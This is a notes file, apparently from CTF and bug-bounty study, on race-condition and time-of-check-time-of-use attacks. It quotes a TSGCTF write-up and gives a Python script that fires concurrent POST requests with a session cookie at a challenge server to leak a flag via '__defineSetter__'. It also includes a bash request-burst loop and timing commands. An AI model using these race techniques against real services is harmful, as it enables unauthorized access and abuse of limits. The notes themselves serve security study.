# keywords

- Concurrent Execution using Shared Resource with Improper Synchronization
- Time-of-check Time-of-use (TOCTOU)

# case studies

### __defineSetter__

https://github.com/mdsnins/ctf-writeups/blob/master/2020/TSGCTF/Beginners%20Web/beginners_web.md

> So when we give `input` as `FLAG_***SESSION***` and `converter` as `__defineSetter__`, it will be excuted as
> 
> ```js
> converters["__defineSetter__"]("FLAG_***SESSION***", (error, result) => {
>     if (error) {
>         reject(error);
>     } else {
>         resolve(result);
>     }
> });
> ```
> 
> Just send two concurrent packets very fast, it will give an answer!  Why? Because, early arrived packet already changed setter of `FLAG_***SESSION***`, and the other packet's request try to set `FLAG_***SESSION***` to `flagConverter`. It will raise an error and show `flagConverter.toString()` which contains a real flag

# methods

https://stackoverflow.com/questions/30686295/how-do-i-run-multiple-subprocesses-in-parallel-and-wait-for-them-to-finish-in-py

https://gist.github.com/0xParrot/310b71266ca2a6bfcaf26b5419c91a0d

```python
import threading
import requests
import time

cookie = {"sessionId" : "HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa.YTlYOIhk52YHs3NzP%2FFPuu6y7MK1ev6uX21jHbgxMXE"}
def sendPayload():
    r = requests.post("http://34.85.124.174:59101",json={"converter":"__defineSetter__","input":"FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa"},cookies=cookie)
    print(r.text)

threading.Thread(target=sendPayload).start()
time.sleep(1)
requests.post("http://34.85.124.174:59101",json={"converter":"base64","input":"FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa"},cookies=cookie)
```

### burst

```bash
for y in $(seq 1 8)
    do (for x in $(seq 1 50)
        do curl -s foo
    done)&
done
```

### burp suite intruder

[#488985 Race condition in claiming program credentials](https://hackerone.com/reports/488985)

# measuring methods

Compute average of differences in nanoseconds:

```bash
((date +%s%N)& (date +%s%N)& (date +%s%N)& (date +%s%N)& (date +%s%N)& (date +%s%N)& (date +%s%N)& (date +%s%N)& (date +%s%N)& (date +%s%N)&) > 1
c=; while read -r i; do c="(date +%s%N)& $c"; done <<< $(seq 1 10); eval $c > 2
seq 1 10 | xargs -i -P0 date +%s%N > 3

for i in 1 2 3; do awk 'NR==1{b=$0; next} {print $0-b; b=$0}' < "$i" | tee $(tty) | awk '{b+=$0} END{print "Average: " b/NR}'; done
```

Output:

```
610048
510720
1300480
846592
1355008
228096
685056
945152
1292032
Average: 863687
582400
677376
1081600
473088
510976
1487360
813312
1385216
1037056
Average: 894265
442112
396544
457984
392960
469760
429824
405504
368128
312320
Average: 408348
```
